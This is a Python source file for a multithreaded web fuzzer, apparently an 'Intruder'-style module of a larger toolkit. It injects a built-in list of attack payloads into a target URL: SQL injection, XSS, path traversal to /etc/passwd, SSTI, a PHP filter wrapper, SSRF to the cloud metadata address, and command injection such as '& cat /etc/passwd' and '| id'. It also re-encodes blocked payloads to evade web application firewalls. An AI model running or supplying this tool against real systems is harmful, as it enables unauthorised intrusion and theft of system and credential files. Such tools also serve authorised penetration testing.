import requests
import concurrent.futures
import urllib.parse
import base64
import os
from colorama import Fore, Style

class UniversalFuzzer:
    def __init__(self, target_url, custom_list=None):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers = {'User-Agent': 'ZeroBurst-Fuzzer/26.0 (Adaptive-Mode)'}
        
        # Default Payload (Polyglots) - Campuran XSS, SQLi, LFI, SSTI
        self.default_payloads = [
            "' OR '1'='1", 
            "<script>alert(1)</script>",
            "../../../../etc/passwd",
            "{{7*7}}",
            "${7*7}",
            "sleep(5)",
            "1' ORDER BY 10--",
            "admin' --",
            "javascript:alert(1)",
            "php://filter/convert.base64-encode/resource=index.php",
            "http://169.254.169.254/latest/meta-data/",
            "",
            "& cat /etc/passwd",
            "| id",
            "%00"
        ]
        
        # Load Custom List jika ada
        if custom_list and os.path.exists(custom_list):
            print(f"{Fore.YELLOW}[+] Loading custom wordlist: {custom_list}{Style.RESET_ALL}")
            with open(custom_list, 'r', errors='ignore') as f:
                self.payloads = [line.strip() for line in f.readlines()]
        else:
            print(f"{Fore.YELLOW}[+] Using Default Polyglot Payloads (Quick Scan){Style.RESET_ALL}")
            self.payloads = self.default_payloads

    def adaptive_encode(self, payload, mode):
        """Mengubah payload jika diblokir WAF"""
        if mode == 'url':
            return urllib.parse.quote(payload)
        elif mode == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif mode == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif mode == 'hex':
            return "".join(["%" + hex(ord(c))[2:] for c in payload])
        return payload

    def test_payload(self, payload):
        """Mengirim satu payload dan menganalisis respon"""
        # Ganti marker FUZZ dengan payload
        if "FUZZ" not in self.target_url:
            return
            
        attack_url = self.target_url.replace("FUZZ", payload)
        
        try:
            res = self.session.get(attack_url, timeout=5)
            length = len(res.text)
            status = res.status_code
            
            # LOGIKA ADAPTIF (WAF EVASION)
            # Jika 403 (Forbidden) atau 406 (Not Acceptable), coba encode ulang
            if status in [403, 406, 500, 501]:
                # Coba URL Encode
                encoded_pay = self.adaptive_encode(payload, 'url')
                url_enc = self.target_url.replace("FUZZ", encoded_pay)
                res_enc = self.session.get(url_enc, timeout=5)
                
                if res_enc.status_code == 200:
                    print(f"   {Fore.MAGENTA}[ADAPTIVE SUCCESS] Blocked -> Bypassed via URL Encode!{Style.RESET_ALL}")
                    print(f"   ├── Orig: {status} | New: {res_enc.status_code}")
                    print(f"   └── Pay : {encoded_pay}")
                    return # Selesai untuk payload ini

            # FILTER OUTPUT (Hanya tampilkan yang menarik)
            # Kita sembunyikan 404 standar
            if status != 404:
                color = Fore.WHITE
                if status == 200: color = Fore.GREEN
                elif status == 500: color = Fore.RED # Potensi Error SQLi/RCE
                elif status in [301, 302]: color = Fore.YELLOW
                elif status == 403: color = Fore.MAGENTA
                
                # Print format rapi ala Fuzzer
                print(f"   [{color}{status}{Style.RESET_ALL}] Size: {length:<6} | Pay: {payload[:40]}")

        except:
            pass

    def run_fuzzer(self):
        print(f"\n{Fore.CYAN}[*] MODULE START: Universal Payload Fuzzer (Intruder){Style.RESET_ALL}")
        
        if "FUZZ" not in self.target_url:
            print(f"{Fore.RED}[!] ERROR: URL must contain 'FUZZ' marker.{Style.RESET_ALL}")
            print(f"    Correct Example: http://site.com/login.php?user=FUZZ&pass=123")
            return

        print(f"{Fore.WHITE}[*] Target: {Fore.GREEN}{self.target_url}")
        print(f"{Fore.WHITE}[*] Payloads: {len(self.payloads)}")
        print(f"{Fore.WHITE}[*] Threads: 20 (High Speed)")
        print("-" * 60)

        # Multi-Threading untuk kecepatan tinggi
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(self.test_payload, self.payloads)

        print("-" * 60)
        print(f"{Fore.GREEN}[*] Fuzzing Completed.{Style.RESET_ALL}")

def run_fuzzing_attack(url, wordlist=None):
    engine = UniversalFuzzer(url, wordlist)
    engine.run_fuzzer()